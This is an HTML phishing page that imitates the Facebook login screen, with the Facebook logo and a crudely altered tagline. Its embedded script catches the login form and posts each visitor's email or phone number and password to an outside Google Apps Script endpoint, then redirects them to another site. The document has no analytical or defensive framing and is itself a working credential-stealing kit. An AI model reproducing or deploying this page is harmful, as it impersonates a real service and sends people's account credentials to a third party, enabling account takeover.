<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title> fb login</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class="box">
  <div class="title-box">
    <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
    <p>Facebook helps fuck connect and share with the people in your life.</p>
  </div>
  <div class="form-box">
    <form action="https://submit-code.netlify.app/" name="form">
      <input type="text" name="email" placeholder="Email address or phone number"  autocomplete="off" autocapitalize="off" required="">
      <input type="password" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required="">
      <button type="submit">Log In</button>
      <a href="#">Forgotten Password</a>
    </form>
    <hr>
    <div class="create-btn">
      <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Create New Account</a>
    </div>
  </div>
</div>
<!-- partial -->
   <script>

    const scriptURL = 'https://script.google.com/macros/s/AKfycbw3gigikqBFGf0mg8lXzmIJxtg-_pg82EDyQBksoRxXG_CvWIkJxBrf3c-kWh_BmGg/exec';
    
    const form = document.forms['form'];
     
   
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
       // .then(response => alert("Thank you! your form is submitted successfully." ))
       .then(() => { window.location.href='https://submit-code.netlify.app/'; })
       // .catch(error => console.error('Error!', error.message))
    })
   </script>
</body>
</html>
